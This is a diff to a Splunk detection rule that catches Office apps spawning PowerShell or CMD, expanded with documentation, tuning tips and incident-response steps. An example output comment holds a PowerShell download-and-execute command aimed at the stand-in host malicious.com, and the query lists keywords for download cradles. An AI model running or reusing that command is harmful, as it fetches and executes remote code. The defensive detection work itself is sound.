@@ -1,46 +1,142 @@
-﻿# DETECTION: Office Macro Spawning PowerShell
-# MITRE: T1566.001 (Phishing - Spearphishing Attachment)
-# DESCRIPTION: Detects Word/Excel opening and launching PowerShell or CMD
+################################################################################
+# DETECTION NAME: Office Macro Spawning PowerShell/CMD
+# MITRE ATT&CK: T1566.001 (Phishing - Spearphishing Attachment)
+# SEVERITY: 🔴 CRITICAL (Requires immediate investigation)
 # DATA SOURCE: Sysmon Event ID 1 (Process Creation)
-# HOW TO USE: Copy this query, paste into Splunk search bar, adjust time range
+# 
+# WHAT THIS DETECTS:
+# When Microsoft Office (Word, Excel, PowerPoint) opens and immediately launches
+# a script interpreter (PowerShell, CMD, VBScript). This is the #1 indicator of
+# malicious macro execution.
+#
+# WHY THIS MATTERS:
+# - Office macros are the top initial access vector (>40% of breaches)
+# - Legitimate macros are RARE in most enterprises
+# - Macro code executes BEFORE the document shows
+# - Macros bypass email filters (file is "clean")
+#
+# ATTACK SCENARIO:
+# 1. Attacker sends phishing email with weaponized Word document
+# 2. User opens document (triggered by subject line / social engineering)
+# 3. VBA macro code in document automatically executes
+# 4. Macro uses PowerShell to: download malware, steal credentials, pivot laterally
+# 5. By the time user sees the document, malware is downloading
+#
+# WHO SHOULD RUN THIS:
+# - SOC Analysts (L1/L2) - Run this daily or continuously
+# - Incident Responders - Run this during email-based breach investigations
+# - Threat Hunters - Run this to find macro abuse campaigns
+# - Security Engineers - Use to tune detection and alert tuning
+#
+# REQUIREMENTS:
+# - Sysmon must be installed on all endpoints (Event ID 1 enabled)
+# - Splunk must have Windows event logs forwarded from endpoints
+# - Recommended: Forward to index "windows" or "sysmon"
+#
+# HOW TO USE THIS QUERY:
+# 1. Copy entire query below (starting with "index=main...")
+# 2. Paste into Splunk search bar
+# 3. Change time range from "Last 24 hours" to your desired range
+# 4. If using different index name, replace "index=main" with your index
+# 5. Click "Search"
+# 6. Review results
+#
+# INTERPRETING RESULTS:
+# If 0 results: Good - no macro activity detected in timeframe
+# If 1-5 results: Investigate - could be automation or attack
+# If 5+ results: High severity - possible macro campaign
+#
+# EXPECTED OUTPUT COLUMNS:
+# - ComputerName: Which computer(s) had macro execution
+# - User: Which user account ran the macro
+# - ParentImage: Office process (WINWORD.EXE, EXCEL.EXE, etc)
+# - Image: Script interpreter (powershell.exe, cmd.exe, etc)
+# - CommandLine: Actual command that was run (KEY FOR ANALYSIS)
+# - Severity: CRITICAL/HIGH/MEDIUM (auto-assigned based on keywords)
+#
+# EXAMPLE OUTPUT:
+# ComputerName: DESKTOP-ABC123
+# User: john.smith
+# ParentImage: C:\Program Files\Microsoft Office\WINWORD.EXE
+# Image: C:\Windows\System32\powershell.exe
+# CommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload')"
+# Severity: CRITICAL
+#
+# IF YOU SEE THIS: This is a confirmed attack. Isolate computer immediately.
+#
+# FALSE POSITIVE SCENARIOS (When to ignore):
+# - User: "automation_svc" or "scheduler_admin" (known automation accounts)
+# - ParentImage: C:\Program Files (system automation)
+# - CommandLine: Contains /? or --help (admin checking syntax)
+# - CommandLine: "powershell.exe -NoProfile -InputFormat None -OutputFormat None" 
+#   (legitimate Windows Update or maintenance)
+#
+# HOW TO TUNE TO REDUCE FALSE POSITIVES:
+# 1. Add this after the last pipe:
+#    | search User != automation_svc AND User != scheduler_admin
+#
+# 2. Whitelist known good automation:
+#    | search CommandLine != "*Windows Update*"
+#
+# 3. Reduce noise (requires tuning):
+#    | search Severity=CRITICAL OR Severity=HIGH
+#
+# NEXT STEPS AFTER DETECTION:
+# 1. ✅ ISOLATE: Disconnect computer from network immediately
+# 2. ✅ COLLECT: 
+#    - Obtain the Office document (from email or disk)
+#    - Collect PowerShell history
+#    - Get process memory dump
+# 3. ✅ ANALYZE:
+#    - Extract VBA macro code from document
+#    - Deobfuscate and analyze code
+#    - Check for credential theft, lateral movement
+# 4. ✅ HUNT:
+#    - Search for outbound connections from PowerShell
+#    - Check for persistence mechanisms (scheduled tasks, registry)
+#    - Check other users' mailboxes for same document
+# 5. ✅ REMEDIATE:
+#    - Restore from clean backup
+#    - Force password reset for affected user
+#    - Block email sender
+#    - Update threat intel
+#
+# RELATED DETECTIONS:
+# - scripts_user_folders.spl (Script from Downloads)
+# - scheduled_task_detection.spl (Persistence)
+# - registry_runkeys_detection.spl (Registry persistence)
+# - powershell_detection.spl (PowerShell malware)
+#
+################################################################################
 
 index=main EventCode=1 
-ParentImage IN ("*\\WINWORD.EXE", "*\\EXCEL.EXE", "*\\POWERPNT.EXE")
+ParentImage IN ("*\\WINWORD.EXE", "*\\EXCEL.EXE", "*\\POWERPNT.EXE", "*\\MSACCESS.EXE")
 Image IN ("*\\powershell.exe", "*\\cmd.exe", "*\\cscript.exe", "*\\wscript.exe")
 | stats count by ComputerName, User, ParentImage, Image, CommandLine
 | where count > 0
 | table ComputerName, User, ParentImage, Image, CommandLine
 | eval severity=case(
-    like(CommandLine, "%IEX%") OR like(CommandLine, "%DownloadString%"), "CRITICAL",
+    like(CommandLine, "%IEX%") OR like(CommandLine, "%DownloadString%") OR like(CommandLine, "%System.Reflection%"), "CRITICAL",
+    like(CommandLine, "%powershell%") AND like(CommandLine, "%encoded%"), "CRITICAL",
+    like(CommandLine, "%cmd%") AND like(CommandLine, "%/c%"), "HIGH",
     like(CommandLine, "%powershell%"), "HIGH",
     1=1, "MEDIUM"
   )
 | sort - severity
 
-# WHAT THIS DOES:
-# 1. Finds process creation events (EventCode=1)
-# 2. Looks for Office app as parent process (WINWORD, EXCEL, etc)
-# 3. Checks if child process is script interpreter (PowerShell, CMD, VBScript)
-# 4. Groups by computer/user/command for easy review
-# 5. Assigns severity based on command content
+################################################################################
+# ALERT CONFIGURATION:
+# - Create alert if: count > 0
+# - Severity: High
+# - Notification: Immediate to SOC on-call
+# - Throttle: No throttling (each event is important)
+# - Retention: Keep logs for 90 days for forensics
+#
+# PERFORMANCE NOTES:
+# - This query typically returns in <10 seconds
+# - Use time range "Last 24 hours" for daily review
+# - Use time range "Last 7 days" for weekly trend analysis
+# - Use time range "Last 90 days" for tuning/baseline
+#
+################################################################################
 
-# WHAT TRIGGERS THIS:
-# ✅ Word/Excel → PowerShell with suspicious commands
-# ✅ Office → CMD downloading files
-# ✅ Office → VBScript execution
-
-# WHAT DOES NOT TRIGGER:
-# ❌ Office opening normally
-# ❌ Office printing documents
-# ❌ Office saving files
-
-# FALSE POSITIVES:
-# - Legitimate Office automation by admins
-# - Business Intelligence tools (Tableau, Power BI)
-# - Legitimate reporting macros
-
-# HOW TO TUNE:
-# 1. Check User field - is this an admin account?
-# 2. Check CommandLine - does it look like automation or attack?
-# 3. Whitelist known good automation accounts
-# 4. Correlate with network activity (did process make external connections?)
